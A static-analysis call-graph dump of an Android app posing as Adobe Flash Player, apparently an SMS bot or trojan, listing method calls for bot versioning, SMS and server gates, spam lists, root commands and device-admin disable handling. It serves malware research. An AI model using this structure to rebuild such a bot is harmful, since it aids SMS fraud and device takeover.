VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.packages.ZLocker: void <init>()>() in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "On", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r13 = virtualinvoke $r15.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?a=0&b=") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke $r60.<java.util.Date: void <init>(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.Date: void <init>(long)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAState", "A", $r2) in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotVer", "5.3") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getAction()>() in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: java.lang.String getAction()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r24, r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashY: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "Off", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("We have a little surprise!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(268435456) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
STATIC edge: $r36 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r8 = virtualinvoke r8.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeZCore: void <init>()> ==> <android.app.Service: void <init>()>
VIRTUAL edge: $r19 = virtualinvoke $r5.<java.lang.String: java.lang.String[] split(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotVer") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("keySmsGate[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r1.<com.adobe.flashplayer_.AdobeZCore$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_SMSGate", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=package&i=system") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r19 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getProcesses") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("root") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, $r21, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:SMSGATE") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "Off", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
SPECIAL edge: specialinvoke $r5.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer/Certificate;") in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: r4 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
INTERFACE edge: interfaceinvoke r5.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r44, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<android.webkit.WebViewClient: void <init>()>() in <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)> ==> <android.webkit.WebViewClient: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.View findViewById(int)>(2131296259) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.View findViewById(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeZCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: android.content.Intent getIntent()>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r1 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r24 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=spamlist&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?a=1&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <android.app.Service: void onCreate()>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent setFlags(int)>(1073741824) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("_", " ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r8 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.Object getSystemService(java.lang.String)>("power") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
